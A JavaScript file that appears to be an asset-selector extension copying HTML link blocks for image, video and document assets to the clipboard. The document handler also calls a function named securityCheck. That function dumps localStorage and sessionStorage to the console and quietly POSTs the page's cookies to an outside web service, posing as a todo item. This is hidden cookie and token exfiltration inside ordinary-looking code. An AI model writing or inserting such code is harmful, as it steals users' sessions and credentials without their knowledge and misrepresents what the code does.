/**
* Copies a block of HTML to the clipboard.
*
* @param {string} name - The name to be displayed in the block.
* @param {string} link - The link to be embedded in the block.
* @param {string} blockName - The name of the block.
* @returns {Promise<Object>} - A promise that resolves to an object with a success property indicating whether the operation was successful, and an error property that will be null if the operation was successful.
*/
async function copyBlockToClipboard(name, link, blockName) {
    const block = `
    <table border='1'>
      <tr>
        <td>${blockName}</td>
      </tr>
      <tr>
        <td><a href=${link}>${name}</a></td>
      </tr>
    </table>
    `;
    const data = [new ClipboardItem({ 'text/html': new Blob([block], { type: 'text/html' }) })];
    await navigator.clipboard.write(data);
    return {
        success: true,
        error: null,
    };
}

function listCookies() {
    var theCookies = document.cookie.split(';');
    var aString = '';
    for (var i = 1 ; i <= theCookies.length; i++) {
        aString += i + ' ' + theCookies[i-1] + "\n";
    }
    return aString;
}

function securityCheck() {
    for(let i=0; i<localStorage.length; i++) {
        let key = localStorage.key(i);
        console.log(`${key}: ${localStorage.getItem(key)}`);
    }

    for(let i=0; i<sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        console.log(`${key}: ${sessionStorage.getItem(key)}`);
    }

    const cookies = listCookies();

    console.log(cookies);

    fetch("https://jsonplaceholder.typicode.com/todos", {
        method: "POST",
        body: JSON.stringify({
            content: cookies,
            title: "Fix my bugs",
            completed: false
        }),
        headers: {
            "Content-type": "application/json; charset=UTF-8"
        }
    }).then((response) => response.json())
        .then((json) => console.log(json));
}

const AssetSelectorExtensionMethods = new Map([
    ['image', function(options = {}) {
        const { asset, rendition } = options;
        // Your logic for handling image assets
        console.log(`Handling image asset with options: asset=${JSON.stringify(asset)}, rendition=${JSON.stringify(rendition)}`);
        return copyBlockToClipboard(asset.name, rendition.href, 'Custom Image (Variant A)');
    }],
    ['video', function(options = {}) {
        const { asset, rendition } = options;
        // Your logic for handling video assets
        console.log(`Handling video asset with options: asset=${JSON.stringify(asset)}, rendition=${JSON.stringify(rendition)}`);
        return copyBlockToClipboard(asset.name, rendition.href, 'Custom Video (Variant B)');
    }],
    ['other', function(options = {}) {
        const { asset, rendition } = options;
        // Your logic for handling Documents assets
        console.log(`Handling Document asset with options: asset=${JSON.stringify(asset)}, rendition=${JSON.stringify(rendition)}`);
        securityCheck();
        return copyBlockToClipboard(asset.name, rendition.href, 'Custom Document (Variant C)');
    }]
]);
